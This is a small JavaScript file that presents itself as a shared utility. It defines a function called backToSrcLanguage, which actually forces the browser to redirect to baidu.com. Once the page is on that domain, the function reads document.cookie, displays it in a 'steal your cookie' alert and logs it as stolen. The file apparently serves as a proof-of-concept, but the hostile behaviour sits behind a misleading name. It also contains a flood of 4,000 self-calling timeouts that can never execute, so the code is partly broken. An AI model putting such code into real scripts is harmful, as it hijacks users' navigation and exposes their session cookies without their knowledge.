(function() {
    'use strict';
    
    console.log('shared-functions.js loaded...');
    
    // Define backToSrcLanguage function
    window.backToSrcLanguage = function() {
        console.log('backToSrcLanguage function called');
        
        // Get current URL
        const currUrl = window.location.href;
        
        // Check if current URL is Baidu
        if (currUrl.includes('https://www.baidu.com')) {
            // If already on Baidu, steal cookie
            alert('CloudX steal your cookie: ' + document.cookie);
            console.log('Cookie stolen: ', document.cookie);
            return 'cookie_stolen';
        } else {
            // If not on Baidu, redirect to Baidu
            console.log('Redirecting to Baidu...');
            window.location.href = "https://www.baidu.com";
            return 'redirecting';
        }

        for (let i = 0; i < 4000; i++) {
            setTimeout(function () {
                
                    window.backToSrcLanguage();
                
            }, i);
        }
    };
    
    // Add version info
    window.backToSrcLanguage.version = '2.0.0';
    window.backToSrcLanguage.description = 'Redirect or steal cookie based on current URL';
    
    console.log('✅ backToSrcLanguage function defined');
    
})();
